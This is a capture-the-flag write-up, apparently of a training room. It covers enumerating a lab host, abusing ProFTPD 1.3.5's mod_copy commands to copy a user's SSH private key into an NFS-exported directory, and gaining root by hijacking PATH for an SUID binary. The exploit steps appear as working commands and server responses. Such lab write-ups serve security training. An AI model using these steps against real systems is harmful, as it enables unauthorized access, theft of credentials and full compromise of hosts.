This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate privileges to root via an SUID binary.

Machine ip: 10.10.205.10

# Enumeration

## nmap scan

```
sudo nmap -sC -sV -oN initialNmap $IP 
```
Open ports:
* 21/tcp (ftp, proftpd)
* 22/tcp (ssh)
* 80/tcp (http)
* 111/tcp (rpcbind)
* 139/tcp (netbios-ssn Samba smbd)
* 445/tcp (netbios-ssn Samba smbd)
* 2049/tcp (nfs)


## smb
I can see that the machine is running samba (smb), so I run rhe following command to check the smb shares:
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.205.10 -oN nmapSmbShares
```
To inspect one of the shares:
```
smbclient //10.10.205.10/anonymous
```
Found a file: log.txt, so we download it with ```get log.txt```
In this log I could find:
* Information generated for Kenobi when generating an SSH key for the user
* Information about the ProFTPD server.

## rpcbind

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.205.10 -oN nmapRpcbind
```
It shows a mount in /var

# Exploit

## ProFtpd

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.
Lets get the version of ProFtpd using netcat to connect to the machine on the FTP port
```
nc $IP 21
```

The ProFTPD version is 1.3.5
To see if there's a vulneravility in this version:
```
searchsploit proftpd 1.3.5
```

And this search found 4 possible exploits: 3 mod_copy and 1 File Copy

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

```
nc $IP 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.205.10]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa 
250 Copy successful
```

We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.
Lets mount the /var/tmp directory to our machine
```
sudo mkdir /mnt/kenobiNFS 
sudo mount $IP:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.
```
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@$IP
```

# Privesc

To search vulnerable files in the system we run the following:
```
find / -perm -u=s -type f 2>/dev/null
```
This shows that we have access to /usr/bin/menu
Running ```strings /usr/bin/menu```

When we look at the results we see curl (an utility found on Linux) is being used in one of the steps during execution. The binary for curl has been directly invoked without using the complete path to the binary. When we don’t specify the complete path the system will look at the PATH variable and search in all the locations that are specified in the path for the file that is required. Since the path variable is editable by anyone we can use this to our advantage.
As this file runs as the root users privileges, we can manipulate our path gain a root shell.

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

